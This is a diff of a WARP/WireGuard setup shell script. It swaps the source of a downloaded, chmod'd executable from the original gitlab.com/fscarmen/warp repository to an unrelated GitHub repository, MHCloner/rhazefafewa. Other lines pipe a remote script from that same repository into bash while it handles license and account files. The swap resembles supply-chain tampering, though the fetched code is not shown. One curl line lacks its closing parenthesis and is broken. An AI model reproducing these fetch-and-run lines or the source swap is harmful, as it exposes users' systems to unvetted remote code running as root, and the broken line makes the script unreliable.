@@ -836,7 +836,7 @@ change_ip() {
       wg-quick down warp >/dev/null 2>&1
       [ -s /etc/wireguard/info.log ] && grep -q 'Device name' /etc/wireguard/info.log && local LICENSE=$(cat /etc/wireguard/license) && local NAME=$(awk '/Device name/{print $NF}' /etc/wireguard/info.log)
       cancel_account /etc/wireguard/warp-account.conf
-      bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh| sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
+      bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
       # 如原来是 plus 账户，以相同的 license 升级，并修改账户和 warp 配置文件
       if [[ -n "$LICENSE" && -n "$NAME" ]]; then
         [ -n "$LICENSE" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --license $LICENSE >/dev/null 2>&1
@@ -1832,7 +1832,7 @@ best_mtu() {
 
 # 寻找最佳 Endpoint，根据 v4 / v6 情况下载 endpoint 库
 best_endpoint() {
-  wget $STACK -qO /tmp/endpoint https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/endpoint/warp-linux-"$ARCHITECTURE" && chmod +x /tmp/endpoint
+  wget $STACK -qO /tmp/endpoint https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/warp-linux-"$ARCHITECTURE" && chmod +x /tmp/endpoint
   [ "$IPV4$IPV6" = 01 ] && wget $STACK -qO /tmp/ip https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/ipv6 || wget $STACK -qO /tmp/ip https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/ipv4
 
   if [[ -e /tmp/endpoint && -e /tmp/ip ]]; then
